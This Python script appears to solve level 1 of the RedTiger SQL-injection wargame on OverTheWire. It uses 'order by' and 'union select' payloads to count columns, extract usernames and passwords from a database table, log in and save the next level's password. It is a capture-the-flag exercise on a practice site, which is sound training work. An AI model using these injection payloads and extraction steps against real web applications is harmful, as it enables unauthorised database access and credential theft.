#!/usr/bin/env python3
import pickle
import tigers as tg
import tiger_cookies


def main():
    """
    Simple sqli injection

    Target: Get the login for the user Hornoxe
    Tablename: level1_users
    """
    table_name = 'level1_users'
    url = "https://redtiger.labs.overthewire.org/level1.php"
    finds = ['username', 'password']  # What we are finding
    pass_r = 'The password for the next level is: '
    level = 'level1login'
    method = 'get'
    inj_param = 'cat'

    # Counting the number of columns
    payload = '1 order by %s'
    p = tg.SqlInjection(url, {}, method, inj_param, payload, check_clear=pass_r)
    if not (columns := p.count_columns_order_by()):
        return False

    # Search for visible columns
    p.payload = f"-1 union select %s from {table_name}"
    resp, visible = p.find_visible_columns(columns)
    if not visible:
        return False

    # Search for desired data
    #p.payload = f"-1 union select %s from {table_name}"
    if not (keys := p.find_param(finds, resp, columns)):
        return False

    # Authorization
    other_param = {'user': keys[0], 'password': keys[1], 'login': 'Login'}
    p.inj_param = ''
    p.other_param = other_param
    p.method = 'post'
    response = p.my_request()

    # Еxtracting data from html
    passw = p.extract_pass(response)
    # Save cookie
    try:
        with open('cooks.pickle', 'rb') as f:
            cooks = pickle.load(f)
    except (FileExistsError, FileNotFoundError):
        cooks = dict(level2login=passw)
    tiger_cookies.save_cookies(cooks, level, passw)


if __name__ == '__main__':
    main()
